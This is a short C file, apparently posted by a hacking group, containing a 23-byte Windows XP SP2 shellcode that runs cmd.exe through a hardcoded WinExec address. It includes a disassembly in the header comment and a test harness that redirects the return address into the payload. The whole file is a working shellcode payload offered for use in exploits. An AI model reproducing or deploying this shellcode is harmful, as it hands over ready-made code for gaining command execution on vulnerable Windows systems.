/*
win32/xp sp2 (En + Ar) cmd.exe 23 bytes
Author : AnTi SeCuRe
TeaM : SauDi ViRuS TeaM
Email : AnTi-SeCuRe@HoTMaiL.CoM
Site : WwW.VxX9.Cc
Thx To : Stack , SauDi ViRuS TeaM ( RENO - Dr.php - ! BaD BoY ! - Jetli007 - Gov.hacker )
Description : It's a 23 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2 English and arabic .
get the following if we disassemle this code compiled with olly debugger

00402000  > 8BEC             MOV EBP,ESP
00402002  . 68 65786520      PUSH 20657865
00402007  . 68 636D642E      PUSH 2E646D63
0040200C  . 8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]
0040200F  . 50               PUSH EAX
00402010  . B8 8D15867C      MOV EAX,kernel32.WinExec
00402015  . FFD0             CALL EAX
*/
#include <stdio.h>
unsigned char shellcode[] =
                        "\x8b\xec\x68\x65\x78\x65"
                        "\x20\x68\x63\x6d\x64\x2e"
                        "\x8d\x45\xf8\x50\xb8\x8D"
                        "\x15\x86\x7C\xff\xd0";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d\n",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}